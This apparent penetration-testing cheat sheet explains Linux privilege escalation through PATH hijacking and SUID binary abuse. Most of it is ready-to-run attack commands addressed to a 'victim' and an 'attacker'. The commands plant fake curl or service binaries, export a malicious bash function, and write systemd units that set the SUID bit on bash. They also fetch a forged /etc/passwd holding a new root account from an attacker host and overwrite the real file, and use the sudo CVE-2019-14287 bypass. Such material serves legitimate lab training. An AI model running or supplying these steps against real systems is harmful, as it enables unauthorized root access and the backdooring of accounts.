# PATH
**PATH** is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.

## 🔍View PATH
```
echo $PATH
env | grep PATH
print $PATH
```
Typically the PATH will look like this:
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin 
```

> ### Note:
> For Practice this privilege escalation process at first we create this binary using root privilege on the terget system. In real world senario you may be find this type of binary then you can use that binary to escalate your privilege.
### 🎯Create a Simple Basic SUID binary
```
cd /home/max/
vi test.c

#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("curl -I 127.0.0.1");

  }
```
### 🎯Compile Binary & Add SUID Bit
```
gcc test.c -o network-tester
chmod u+s network-tester
mv network-tester /bin/tools/
```
## 📌Example 1 (Without full bin path)
### 📍Privilege Escalation
```
# => Find the SUID Binary:
# -----------------------
find / -perm -u=s -type f 2>/dev/null | xargs ls -l		# → Finds all files with the SUID bit set, then lists their details.
# Output Example: /bin/tools/network-tester

ls -la /bin/tools/network-tester				# → Displays detailed file permissions and ownership for the SUID binary /bin/tools/network-tester.

# ---------------------------------------------------------------------------------------------------------------------------------------

# => Test the SUID Binary:
# -----------------------
 /bin/tools/network-tester			# → Executes the SUID binary to see what it does (in this example, it likely calls “curl -I 127.0.0.1”).
strings /bin/tools/network-tester		# → Extracts human-readable strings from the binary; here, it shows “curl -I 127.0.0.1” indicating its function.
# Output Example: curl -I 127.0.0.1 

# ---------------------------------------------------------------------------------------------------------------------------------------

# => Absue the SUID Binary:
# -------------------------
echo "/bin/bash" > /tmp/curl		# → Creates a file at /tmp/curl that contains the command “/bin/bash”.
chmod 777 /tmp/curl			# → Changes permissions of /tmp/curl to be readable, writable, and executable by everyone.
echo $PATH				# → Displays the current PATH environment variable, which tells the shell where to look for executables.
export PATH=/tmp:$PATH			# → Prepends /tmp to the PATH so that executables in /tmp are found first.
/bin/tools/network-tester		# → Runs the SUID binary again—this time, due to the modified PATH, it will find and execute /tmp/curl instead of the intended binary.
id && whoami				# → Displays the user’s identity; if successful, it shows you now have a root shell.
```

## 📌Example 2 (Without full bin path)
### 📍Privilege Escalation
```
# => Find the SUID Binary:
# ------------------------
find / -perm -u=s -type f 2>/dev/null | xargs ls -l		# → Finds all files with the SUID bit set and lists them with details.
# Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status				# → Displays detailed info about the SUID binary including permissions and ownership.

# ----------------------------------------------------------------------------------------------------------------------------------------

# => Test the SUID Binary:
# ------------------------
/bin/tools/webserver-status					# → Executes the SUID binary to observe its behavior.
strings /bin/tools/webserver-status				# → Reads and prints human-readable strings in the binary to detect called programs like "service".
# Output Example: service apache2 status

# ----------------------------------------------------------------------------------------------------------------------------------------

# => Absue the SUID Binary:
# -------------------------
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service	# → Creates a C source file named 'service' that spawns a root shell.
gcc /tmp/service -o /tmp/service				# → Compiles the 'service' C code into an executable at /tmp/service.
chmod 777 /tmp/service						# → Gives full permissions to everyone for the new fake 'service' binary.
export PATH=/tmp:$PATH						# → Prepends /tmp to the PATH, making our malicious service binary found first.
echo $PATH							# → Displays the current PATH to confirm /tmp is at the front.
/bin/tools/webserver-status					# → Runs the SUID binary again—now it executes our fake 'service' binary from /tmp with root privileges.
id && whoami							# → Displays the current user info; confirms if you now have root-level access.
```

## 📌Example 3 (With full bin path)
### 📍Privilege Escalation
```
# => Find the SUID Binary:
# ------------------------
find / -perm -u=s -type f 2>/dev/null | xargs ls -l		# → Searches for all SUID binaries on the system and lists them with detailed permissions.
# Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status				# → Displays detailed information about the SUID binary found, verifying its existence and permissions.

# ----------------------------------------------------------------------------------------------------------------------------------------

# => Test the SUID Binary:
# ------------------------
/bin/tools/webserver-status					# → Executes the binary to understand its behavior and check for internal commands it runs.
strings /bin/tools/webserver-status				# → Extracts printable strings from the binary to find clues—e.g., shows it runs “/usr/sbin/service apache2 status”.
Output Example: /usr/sbin/service apache2 status

# ----------------------------------------------------------------------------------------------------------------------------------------

# => Absue the SUID Binary:
# ------------------------
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }	# → Creates a function named “/usr/sbin/service” that copies bash to /tmp, gives it the SUID bit, and spawns a root shell.
export -f /usr/sbin/service					# → Exports the malicious function to the environment so it can be called when the SUID binary runs.
 /bin/tools/webserver-status					# → Runs the SUID binary again—this time it uses our malicious service function instead of the real /usr/sbin/service.
id && whoami							# → Verifies if the shell is now running as root by showing UID 0 and username root.
```

## 📌Example 4 (/bin/systemctl)
### 📍Privilege Escalation
Copy line by line inside the victim low priv shell
```
TF=$(mktemp).service						# → Creates a temporary filename with a .service extension and stores it in the TF variable.
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF				# → Writes a systemd service unit file that, when run, sets the SUID bit on /bin/bash (logs to /tmp/output).
systemctl link $TF						# → Links the temporary .service file into the systemd system service directory.
systemctl enable --now $TF					# → Enables and starts the service immediately, triggering the SUID permission change on /bin/bash.
/bin/bash -p							# → Starts a bash shell with preserved privileges (because SUID bit is now set on /bin/bash).
id && whoami							# → Displays the current user's UID, GID, and username—if successful, shows root access.
```
**OR**
```
nano /etc/systemd/system/vsftpd.service			# → Opens or creates a systemd service file for editing.
# Add the following inside the file:
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash'
#ExecReload=/bin/kill -HUP $MAINPID
#ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

systemctl daemon-reload				# → Reloads systemd manager configuration to recognize the new or edited service file.
systemctl start vsftpd.service			# → Starts the vsftpd service, which runs the malicious ExecStart as root and creates a SUID-root bash shell at /tmp/bash.
ls -l /tmp/bash					# → Lists the permissions of the /tmp/bash file to confirm the SUID bit is set (look for -rwsr-xr-x).
/tmp/bash -p					# → Launches the newly created SUID bash shell with preserved root privileges.
id && whoami					# → Confirms the current identity — if the exploit worked, it will show root access (uid=0, root).
```

## 📌Example 5 (Copy - /bin/cp)
### 📍Privilege Escalation
**🎯Victim**
```
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
Copy the contents of /etc/passwd to your local machine inside a new file called "passwd"
```
**💀Attacker**
```
Run the following command locally: openssl passwd -1 -salt ignite NewRootPassword
Copy the output
Add the following inside the local passwd file
echo "root2:<output>:0:0:root:/root:/bin/bash" >> passwd // Replace <output> with the copied output
python -m SimpleHTTPServer 9000
```
**🎯Victim**
```
wget -O /tmp/passwd http://10.10.10.10:9000/passwd
cp /tmp/passwd /etc/passwd
su root2
Password: NewRootPassword
id && whoami

// Replace Attacker IP & Port
```
### 🚀Bonus Example
```
sudo -u#-1 /usr/bin/vi /home/user/text.txt //don't forget to try CVE-2019-14287
```
